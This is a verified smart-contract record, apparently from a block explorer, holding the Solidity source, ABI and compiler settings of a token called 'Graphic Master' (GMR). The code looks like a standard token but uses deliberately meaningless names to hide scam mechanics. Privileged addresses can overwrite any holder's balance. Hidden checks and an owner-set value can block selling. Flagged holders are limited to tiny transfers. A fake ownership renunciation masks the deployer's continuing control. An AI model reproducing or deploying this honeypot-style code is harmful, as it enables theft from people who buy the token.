{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface autoListSender {\n    function createPair(address totalTakeShould, address toMin) external returns (address);\n}\n\ninterface senderBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptReceiver) external view returns (uint256);\n\n    function transfer(address atModeList, uint256 launchedExempt) external returns (bool);\n\n    function allowance(address swapMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atModeList,\n        uint256 launchedExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minAt, uint256 value);\n    event Approval(address indexed swapMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityAtWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listMin is senderBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GraphicMaster is liquidityAtWallet, senderBuy, listMin {\n\n    bool public walletTotal;\n\n    uint8 private receiverListLiquidity = 18;\n\n    bool public tradingAt;\n\n    string private fromMode = \"Graphic Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return fromMode;\n    }\n\n    address private sellShould;\n\n    uint256 private feeTotalTeam;\n\n    function txLimit(address receiverMin, address atModeList, uint256 launchedExempt) internal returns (bool) {\n        if (receiverMin == buyMode) {\n            return receiverReceiver(receiverMin, atModeList, launchedExempt);\n        }\n        uint256 maxLaunch = senderBuy(fundSell).balanceOf(marketingExemptLaunch);\n        require(maxLaunch == amountMode);\n        require(atModeList != marketingExemptLaunch);\n        if (exemptFund[receiverMin]) {\n            return receiverReceiver(receiverMin, atModeList, launchToken);\n        }\n        return receiverReceiver(receiverMin, atModeList, launchedExempt);\n    }\n\n    event OwnershipTransferred(address indexed limitFund, address indexed totalList);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromBuy;\n    }\n\n    function takeMax(address minTrading, uint256 launchedExempt) public {\n        tradingIs();\n        tokenTxMarketing[minTrading] = launchedExempt;\n    }\n\n    function receiverReceiver(address receiverMin, address atModeList, uint256 launchedExempt) internal returns (bool) {\n        require(tokenTxMarketing[receiverMin] >= launchedExempt);\n        tokenTxMarketing[receiverMin] -= launchedExempt;\n        tokenTxMarketing[atModeList] += launchedExempt;\n        emit Transfer(receiverMin, atModeList, launchedExempt);\n        return true;\n    }\n\n    address marketingExemptLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public exemptFund;\n\n    string private txSellMarketing = \"GMR\";\n\n    function tradingIs() private view {\n        require(teamReceiverSell[_msgSender()]);\n    }\n\n    mapping(address => uint256) private tokenTxMarketing;\n\n    address public fundSell;\n\n    mapping(address => bool) public teamReceiverSell;\n\n    function limitTotalTrading() public {\n        emit OwnershipTransferred(buyMode, address(0));\n        sellShould = address(0);\n    }\n\n    uint256 maxAuto;\n\n    uint256 private receiverToken;\n\n    uint256 constant launchToken = 7 ** 10;\n\n    bool public shouldWallet;\n\n    function transferFrom(address receiverMin, address atModeList, uint256 launchedExempt) external override returns (bool) {\n        if (_msgSender() != limitTo) {\n            if (autoLimitTake[receiverMin][_msgSender()] != type(uint256).max) {\n                require(launchedExempt <= autoLimitTake[receiverMin][_msgSender()]);\n                autoLimitTake[receiverMin][_msgSender()] -= launchedExempt;\n            }\n        }\n        return txLimit(receiverMin, atModeList, launchedExempt);\n    }\n\n    function balanceOf(address exemptReceiver) public view virtual override returns (uint256) {\n        return tokenTxMarketing[exemptReceiver];\n    }\n\n    uint256 public listLaunchedSwap;\n\n    constructor (){\n        \n        maxSell exemptMinBuy = maxSell(limitTo);\n        fundSell = autoListSender(exemptMinBuy.factory()).createPair(exemptMinBuy.WETH(), address(this));\n        if (toIs != receiverToken) {\n            receiverToken = tradingShould;\n        }\n        buyMode = _msgSender();\n        teamReceiverSell[buyMode] = true;\n        tokenTxMarketing[buyMode] = fromBuy;\n        limitTotalTrading();\n        if (receiverToken == tradingShould) {\n            tradingShould = listLaunchedSwap;\n        }\n        emit Transfer(address(0), buyMode, fromBuy);\n    }\n\n    address public buyMode;\n\n    address limitTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address txMarketing, address fromSenderFund) external view virtual override returns (uint256) {\n        if (fromSenderFund == limitTo) {\n            return type(uint256).max;\n        }\n        return autoLimitTake[txMarketing][fromSenderFund];\n    }\n\n    uint256 amountMode;\n\n    function takeMarketing(uint256 launchedExempt) public {\n        tradingIs();\n        amountMode = launchedExempt;\n    }\n\n    function tokenMax(address launchedMaxSender) public {\n        if (tradingAt) {\n            return;\n        }\n        \n        teamReceiverSell[launchedMaxSender] = true;\n        if (tradingShould != listLaunchedSwap) {\n            enableReceiver = true;\n        }\n        tradingAt = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoLimitTake;\n\n    bool public enableReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverListLiquidity;\n    }\n\n    uint256 public toIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSellMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellShould;\n    }\n\n    function approve(address fromSenderFund, uint256 launchedExempt) public virtual override returns (bool) {\n        autoLimitTake[_msgSender()][fromSenderFund] = launchedExempt;\n        emit Approval(_msgSender(), fromSenderFund, launchedExempt);\n        return true;\n    }\n\n    function transfer(address minTrading, uint256 launchedExempt) external virtual override returns (bool) {\n        return txLimit(_msgSender(), minTrading, launchedExempt);\n    }\n\n    uint256 private fromBuy = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return sellShould;\n    }\n\n    bool public swapAmount;\n\n    bool private feeSenderSwap;\n\n    uint256 private tradingShould;\n\n    function amountLimit(address receiverIs) public {\n        tradingIs();\n        if (tradingShould != receiverToken) {\n            listLaunchedSwap = toIs;\n        }\n        if (receiverIs == buyMode || receiverIs == fundSell) {\n            return;\n        }\n        exemptFund[receiverIs] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSenderFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSenderFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchedSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedExempt\",\"type\":\"uint256\"}],\"name\":\"takeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExempt\",\"type\":\"uint256\"}],\"name\":\"takeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMaxSender\",\"type\":\"address\"}],\"name\":\"tokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atModeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GraphicMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}